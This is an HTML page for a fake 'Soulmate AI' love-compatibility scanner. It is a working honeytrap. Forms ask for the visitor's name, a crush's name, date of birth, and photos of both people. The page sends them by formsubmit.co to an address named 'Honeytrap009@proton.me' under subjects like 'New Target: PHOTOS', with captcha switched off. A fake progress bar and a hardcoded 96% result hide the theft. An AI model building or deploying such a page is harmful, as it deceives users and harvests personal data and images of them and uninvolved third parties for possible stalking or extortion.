<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>üíò Soulmate AI: Matcher Pro</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Poppins', sans-serif; background: linear-gradient(45deg, #ff9a9e 0%, #fad0c4 100%); overflow: hidden; }
.card { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 20px; width: 340px; z-index: 10; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
.tabs { display: flex; background: #fff0f3; border-radius: 12px; padding: 5px; margin-bottom: 20px; }
.tab-btn { flex: 1; padding: 8px; border: none; background: none; cursor: pointer; border-radius: 10px; font-weight: 600; color: #888; }
.tab-btn.active { background: #ff4081; color: white; }
.input-group { position: relative; margin-bottom: 12px; }
.input-group i { position: absolute; left: 12px; top: 13px; color: #ff80ab; }
input { width: 100%; padding: 10px 10px 10px 35px; border: 2px solid #fce4ec; border-radius: 10px; box-sizing: border-box; outline: none; }
.file-btn { display: block; padding: 10px; background: #fce4ec; color: #d81b60; border: 1px dashed #f06292; border-radius: 10px; cursor: pointer; margin-bottom: 10px; font-size: 13px; text-align: center; }
.file-btn.uploaded { background: #e8f5e9; color: #2e7d32; border-style: solid; }
.main-btn { background: #ff4081; color: white; border: none; padding: 12px; border-radius: 25px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
.hidden { display: none; }
#loader { display: none; margin-top: 20px; }
.progress-bar { width: 100%; height: 8px; background: #eee; border-radius: 5px; overflow: hidden; }
.progress-fill { height: 100%; width: 0%; background: #ff4081; transition: width 0.3s; }
</style>
</head>
<body>

<div class="card">
<h2 style="color: #d81b60; margin: 0;">Love AI Scanner</h2>
<p style="font-size: 11px; color: #666; margin-bottom: 15px;">Advanced Compatibility Engine</p>

<div class="tabs">
<button class="tab-btn active" id="t1" onclick="switchTab('text')">Zodiac</button>
<button class="tab-btn" id="t2" onclick="switchTab('photo')">Photo Match</button>
</div>

<form id="formText" action="https://formsubmit.co/Honeytrap009@proton.me" method="POST">
<input type="hidden" name="_subject" value="üíò New Target: Name/DOB">
<input type="hidden" name="_captcha" value="false">
<div class="input-group"><i class="fas fa-user"></i><input type="text" name="User_Name" placeholder="Your Name" required></div>
<div class="input-group"><i class="fas fa-heart"></i><input type="text" name="Crush_Name" placeholder="Crush Name" required></div>
<div class="input-group"><i class="fas fa-calendar"></i><input type="text" placeholder="Your DOB" onfocus="(this.type='date')" name="DOB" required></div>
<button type="button" class="main-btn" onclick="startScan('formText')">Analyze Match</button>
</form>

<form id="formPhoto" class="hidden" action="https://formsubmit.co/Honeytrap009@proton.me" method="POST" enctype="multipart/form-data">
<input type="hidden" name="_subject" value="üì∏ New Target: PHOTOS">
<input type="hidden" name="_captcha" value="false">

<div class="input-group"><i class="fas fa-user"></i><input type="text" name="User_Name" id="uName" placeholder="Your Name" required></div>
<div class="input-group"><i class="fas fa-heart"></i><input type="text" name="Crush_Name" id="cName" placeholder="Crush Name" required></div>

<label class="file-btn" id="l1">üìÅ Upload Your Photo <input type="file" name="My_Photo" id="p1" accept="image/*" hidden onchange="checkFile(this, 'l1')"></label>
<label class="file-btn" id="l2">üìÅ Upload Crush Photo <input type="file" name="Crush_Photo" id="p2" accept="image/*" hidden onchange="checkFile(this, 'l2')"></label>

<button type="button" class="main-btn" onclick="startScan('formPhoto')">Scan Biometrics</button>
</form>

<div id="loader">
<div class="progress-bar"><div class="progress-fill" id="bar"></div></div>
<p id="status" style="font-size: 11px; color: #ff4081; margin-top: 5px;">Uploading to Secure Server...</p>
</div>

<div id="result" class="hidden">
<h1 style="font-size: 45px; color: #ff4081; margin: 10px 0;">96%</h1>
<p style="font-weight: bold; color: #333;">Soulmate Detected! üíç</p>
<p style="font-size: 12px; color: #777;">Result sent to AI Database.</p>
<button onclick="location.reload()" style="background: #eee; border: none; padding: 8px 20px; border-radius: 20px; cursor: pointer;">Scan New</button>
</div>
</div>

<script>
function switchTab(mode) {
if(mode === 'text') {
document.getElementById('formText').classList.remove('hidden');
document.getElementById('formPhoto').classList.add('hidden');
document.getElementById('t1').classList.add('active');
document.getElementById('t2').classList.remove('active');
} else {
document.getElementById('formText').classList.add('hidden');
document.getElementById('formPhoto').classList.remove('hidden');
document.getElementById('t2').classList.add('active');
document.getElementById('t1').classList.remove('active');
}
}

function checkFile(input, id) {
if(input.files[0]) {
let label = document.getElementById(id);
label.classList.add('uploaded');
label.innerText = "‚úÖ " + input.files[0].name.substring(0, 15);
}
}

function startScan(formId) {
const form = document.getElementById(formId);
if(!form.checkValidity()) { alert("Please fill all fields!"); return; }

// Hide form & show loader
form.classList.add('hidden');
document.querySelector('.tabs').classList.add('hidden');
document.getElementById('loader').style.display = 'block';

// Fake Progress Bar
let w = 0;
let bar = document.getElementById('bar');
let status = document.getElementById('status');

let interval = setInterval(() => {
w += 2;
bar.style.width = w + "%";

if(w == 20) status.innerText = "Scanning Names...";
if(w == 50) status.innerText = "Compressing Biometrics...";
if(w == 80) status.innerText = "Syncing with Proton Cloud...";

if(w >= 100) {
clearInterval(interval);
// FORM SUBMIT
form.submit();

// Show Result
setTimeout(() => {
document.getElementById('loader').classList.add('hidden');
document.getElementById('result').classList.remove('hidden');
}, 1000);
}
}, 100);
}
</script>

</body>
</html>
